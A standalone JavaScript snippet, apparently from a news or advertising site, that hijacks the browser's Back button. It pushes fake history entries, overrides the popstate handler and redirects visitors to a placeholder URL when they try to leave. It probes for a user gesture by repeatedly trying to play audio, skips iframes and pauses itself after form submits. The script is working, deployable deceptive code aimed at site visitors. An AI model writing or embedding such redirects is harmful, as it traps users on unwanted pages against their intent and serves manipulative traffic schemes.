(function () {
    const Url = 'http://<REDIRECT_URL>',
        Depth = 2;

    var redFlag = false,
        disabled = false;


    disabled = (document.cookie.indexOf('newstrendsDisableBackfix') !== -1);
    document.addEventListener("DOMContentLoaded", function () {
        document.querySelectorAll("form").forEach(function (value) {
            value.addEventListener("submit", function () {
                disabled = true;
                document.cookie = 'newstrendsDisableBackfix=1;expires=' + (new Date(Date.now() + 60 * 5 * 1000)).toGMTString();
            });
        });
    });

    if (document.readyState === 'complete' || document.readyState === 'loaded' || document.readyState === 'interactive') {
        brave();
    } else {
        document.addEventListener("DOMContentLoaded", brave);
    }

    function brave() {
        window.back_url = null;

        if (disabled === true) {
            return;
        }

        var links = document.getElementsByTagName('a');

        for (var i = 0; i < links.length; i++) {
            links[i].addEventListener("click", function () {
                redFlag = true;
            });
        }

        backInFrame(Url);
    }

    function backInFrame(Url) {
        for (var t = 0; Depth > t; ++t) window.history.pushState({}, '', window.location.href + '#' + t);

        if (!isIos()) {
            checkUserGesture(function () {
                for (var t = 0; Depth > t; ++t) window.history.pushState({}, '', window.location.href + '#' + t);
            });
        }

        window.onpopstate = function (t) {
            setTimeout(
                function () {
                    if (redFlag === true) {
                        redFlag = false;
                        return;
                    }

                    if (disabled === true) {
                        history.go(-Depth);
                        return;
                    }

                    if (getUrlVar('frame') === 1 || isInIframe()) return;

                    if (!isIos() && !!!t.state) return;
                    window.location.href = Url;
                },
                10
            );
        };
    }

    function getUrlVar(key) {
        var p = window.location.search;
        p = p.match(new RegExp('[?&]{1}(?:' + key + '=([^&$#=]+))'));
        return p ? p[1] : '';
    }

    function isInIframe() {
        try {
            return window != window.top || document != top.document || self.location != top.location;
        } catch (e) {
            return true;
        }
    }

    function checkUserGesture(callback) {
        var st = setInterval(function () {
            var audio = document.createElement('audio');
            var playPromise = audio.play();
            if (playPromise instanceof Promise) {
                if (!audio.paused) {
                    clearInterval(st);
                    callback();
                }
                playPromise.then(function (e) {

                }).catch(function (error) {

                });
            } else {
                if (!audio.paused) {
                    clearInterval(st);
                    callback();
                }
            }
        }, 100);
    }

    function isIos() {
        return [
            'iPad Simulator',
            'iPhone Simulator',
            'iPod Simulator',
            'iPad',
            'iPhone',
            'iPod',
            'Macintosh',
            'MacIntel',
            'MacPPC',
            'Mac68K',
            'Mac68K'
        ].indexOf(navigator.platform) !== -1;
    }
})(window);